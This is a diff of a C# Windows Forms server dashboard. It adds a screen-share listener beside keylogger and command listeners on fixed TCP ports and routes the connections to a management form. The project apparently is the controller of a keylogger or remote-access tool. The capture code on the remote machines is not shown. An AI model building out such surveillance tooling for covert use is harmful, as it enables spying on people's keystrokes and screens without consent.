@@ -10,13 +10,22 @@ namespace Server
 
         TcpListener server;
         TcpListener klog;
+        TcpListener ShareScreen;
         Thread Listen;
         TcpClient client;
         TcpClient klogClient;
+        TcpClient ShareScreenClient;
+
+
+
+
         public DashBoardForm()
         {
             server = new TcpListener(IPAddress.Any, 8000);
             klog = new TcpListener(IPAddress.Any, 8001);
+            ShareScreen = new TcpListener(IPAddress.Any, 8002);
+
+
             CheckForIllegalCrossThreadCalls = false;
 
             Listen = new Thread(ListenFunc);
@@ -27,45 +36,60 @@ namespace Server
         }
 
 
+
         void ListenFunc()
         {
-            while (true)
-            {
-                try
-                {
-                    
+            try
+            { 
                     server.Start();
                     klog.Start();
+                    ShareScreen.Start();
                     while (true)
                     {
                         client = server.AcceptTcpClient();
                         klogClient = klog.AcceptTcpClient();
+                        ShareScreenClient = ShareScreen.AcceptTcpClient();
+
                         ConnectBx.Text += "Connected to " + client.Client.RemoteEndPoint.ToString() + "\r\n";
-                        // ConnectBx.Text += "Connected to " + klogClient.Client.RemoteEndPoint.ToString() + "\r\n";
                         Thread t = new Thread(ClientThread);
                         t.IsBackground = true;
                         t.Start();
                     }
-                }
-                catch (Exception ex)
-                {
-                    StopListen();
-                    MessageBox.Show(ex.Message);
-                }
+
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Listen end.");
+                StopListen();
+                MessageBox.Show(ex.Message);
             }
         }
 
         void StopListen()
         {
+
+            ShareScreen.Stop();
             server.Stop();
             klog.Stop();
+            if (Listen.IsAlive)
+              Listen.Abort();
         }
 
         void ClientThread()
         {
-            Form Klg = new KeyLogger(klogClient);
-            Klg.Show();
-            Application.Run(Klg);
+            try
+            {
+                Form manageForm = new ManageForm(klogClient, ShareScreenClient, client);
+                manageForm.Show();
+                Application.Run();
+            }
+
+            catch (Exception e)
+            {
+                MessageBox.Show("Manage Form end.");
+                MessageBox.Show(e.Message);
+                Application.Exit();
+            }
 
 
         }
